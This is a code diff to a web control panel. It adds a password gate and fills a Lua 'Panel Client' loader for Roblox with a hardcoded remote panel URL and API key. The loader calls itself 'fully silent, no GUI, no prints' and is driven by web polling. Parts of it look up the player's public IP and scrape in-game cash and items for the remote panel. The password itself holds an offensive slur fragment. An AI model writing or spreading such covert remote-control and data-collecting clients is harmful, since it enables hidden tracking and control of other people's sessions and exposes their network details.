@@ -544,10 +544,92 @@
         .modal-btn:hover { background: var(--bg-card-hover); }
         .modal-btn.primary { background: #6366f1; border-color: #818cf8; color: #fff; }
         .modal-btn.primary:hover { background: #818cf8; }
+    
+        /* LOGIN SCREEN */
+        #loginScreen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 24px;
+        }
+        #loginScreen.hidden { display: none !important; }
+        .login-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-box h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        .login-box p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 16px;
+            transition: border 0.2s;
+        }
+        .login-box input:focus { border-color: var(--accent-blue); }
+        .login-box input::placeholder { color: var(--text-muted); }
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            border-radius: 10px;
+            border: none;
+            background: var(--accent-blue);
+            color: #fff;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: filter 0.2s;
+        }
+        .login-box button:hover { filter: brightness(1.1); }
+        .login-error {
+            color: var(--accent-red);
+            font-size: 12px;
+            margin-top: 12px;
+            display: none;
+        }
+        .login-error.show { display: block; }
+
     </style>
+<base target="_blank">
 <base target="_blank">
 </head>
 <body>
+
+<!-- LOGIN SCREEN -->
+<div id="loginScreen">
+    <div class="login-box">
+        <h1>🔒 Control Panel</h1>
+        <p>Enter the panel password to continue</p>
+        <input type="password" id="loginPassword" placeholder="Password" onkeydown="if(event.key==='Enter')doLogin()">
+        <button onclick="doLogin()">Unlock</button>
+        <div class="login-error" id="loginError">Wrong password. Try again.</div>
+    </div>
+</div>
+
 
 <div class="toast" id="toast"></div>
 
@@ -658,12 +740,12 @@
 </div>
 
 <script>
-const LOADER_TEMPLATE = `const LOADER_TEMPLATE = `--[[
+const LOADER_TEMPLATE = `--[[
   Panel Client v3 — fully silent, no GUI, no prints
   Controlled exclusively via web panel polling.
 ]]
-local BASE = "{{PANEL_URL}}"
-local KEY  = "{{API_KEY}}"
+local BASE = "https://roblox-panel-4h3i.onrender.com"
+local KEY  = "aggredireontopstupidnga"
 
 local Players            = game:GetService("Players")
 local HttpService        = game:GetService("HttpService")
@@ -749,7 +831,7 @@ local function publicIp()
     end)
     if res and res.Body then
         local ip = tostring(res.Body):gsub("%s+", "")
-        if string.match(ip, "^[%d%.:%a]+$") and #ip >= 3 and #ip <= 60 then
+        if string.match(ip, "^[%d%.:%a]+\$") and #ip >= 3 and #ip <= 60 then
             cachedIp = ip
         end
     end
@@ -777,11 +859,11 @@ local function collectBrainrots()
                 if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
                     local text = obj.Text
                     if string.find(text, "Cookie") or string.find(text, "Milki")
-                       or string.find(text, "%$")
-                       or (string.match(text, "^%d+$") and tonumber(text) > 100) then
+                       or string.find(text, "%\$")
+                       or (string.match(text, "^%d+\$") and tonumber(text) > 100) then
                         cash = text
                     end
-                    if not string.match(text, "^%d+$")
+                    if not string.match(text, "^%d+\$")
                        and not string.find(text, "Template")
                        and not string.find(text, "Cookie")
                        and not string.find(text, "Milki")
@@ -1416,6 +1498,39 @@ document.addEventListener('DOMContentLoaded', () => {
 document.getElementById('loaderModal').addEventListener('click', (e) => {
     if (e.target === document.getElementById('loaderModal')) closeLoaderModal();
 });
+</script>
+
+<script>
+(function() {
+    const PANEL_PASSWORD = 'aggredireontopstupidnga';
+    const DEFAULT_PANEL_URL = 'https://roblox-panel-4h3i.onrender.com';
+    const DEFAULT_API_KEY = 'aggredireontopstupidnga';
+
+    window.doLogin = function() {
+        var input = document.getElementById('loginPassword').value;
+        var errorEl = document.getElementById('loginError');
+        var screen = document.getElementById('loginScreen');
+
+        if (input === PANEL_PASSWORD) {
+            screen.style.display = 'none';
+            errorEl.style.display = 'none';
+
+            var urlInput = document.getElementById('panelUrl');
+            var keyInput = document.getElementById('apiKey');
+            if (urlInput) urlInput.value = DEFAULT_PANEL_URL;
+            if (keyInput) keyInput.value = DEFAULT_API_KEY;
+
+            if (typeof updateLoader === 'function') {
+                try { updateLoader(); } catch(e) {}
+            }
+        } else {
+            errorEl.classList.add('show');
+            errorEl.style.display = 'block';
+            document.getElementById('loginPassword').value = '';
+            document.getElementById('loginPassword').focus();
+        }
+    };
+})();
 </script>
 
 </body>
